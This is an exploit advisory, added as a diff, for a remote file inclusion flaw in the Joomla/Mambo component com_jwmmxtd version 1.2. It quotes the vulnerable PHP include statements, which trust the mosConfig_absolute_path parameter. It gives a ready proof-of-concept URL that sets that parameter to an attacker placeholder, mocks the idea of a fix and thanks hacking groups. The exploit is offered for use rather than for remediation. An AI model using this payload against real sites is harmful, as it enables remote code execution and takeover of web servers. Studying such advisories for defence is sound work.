@@ -1,0 +1,42 @@
+#################################################################
+	Joomla component com_jwmmxtd <= Remote File Inclusion Vulnerability
+#################################################################
+
+Info:	"JW Media Manager XTD" (com_jwmmxtd) Administrator Component for Joomla! 1.0.x & Mambo 4.5.x/4.6.x
+Version:	1.2	
+License:	http://www.gnu.org/copyleft/gpl.html
+Page:	http://www.joomlaworks.gr
+Download: http://joomlaworks.googlecode.com/files/com_jwmmxtd_v1.2.zip
+
+#################################################################
+
+Author:	eidelweiss
+Contact:	eidelweiss[at]cyberservices[dot]com
+Thanks:	JosS (hack0wn) - r0073r & 0x1D (inj3ct0r) - LeQhi - aRiee - idiot_inside - kuris
+Special:	AL-MARHUM - [D]eal [C]yber - syabilla_putri (miss u)
+
+#################################################################
+
+-=[ BUG ]=-
+
+[+] admin.jwmmxtd.php
+
+-=[ VULN ]=-
+
+	// Language File
+	if (file_exists($mosConfig_absolute_path.'/administrator/components/'.JWMMXTD_COMP.'/language/'.$mosConfig_lang.'.php')) {
+		include_once ($mosConfig_absolute_path.'/administrator/components/'.JWMMXTD_COMP.'/language/'.$mosConfig_lang.'.php');
+	} else {
+		include_once ($mosConfig_absolute_path.'/administrator/components/'.JWMMXTD_COMP.'/language/english.php');
+	}
+
+	// PCLZIP Library
+	include_once ($mosConfig_absolute_path.'/administrator/components/'.JWMMXTD_COMP.'/lib/pclzip.class.php');
+
+-=[ P0C ]=-
+
+http://127.0.0.1/administrator/components/com_jwmmxtd/admin.jwmmxtd.php?mosConfig_absolute_path= [inj3ct0r]
+
+#################################################################
+[ FIX ] Use Your Skill and Play Your Imagination
+#################################################################
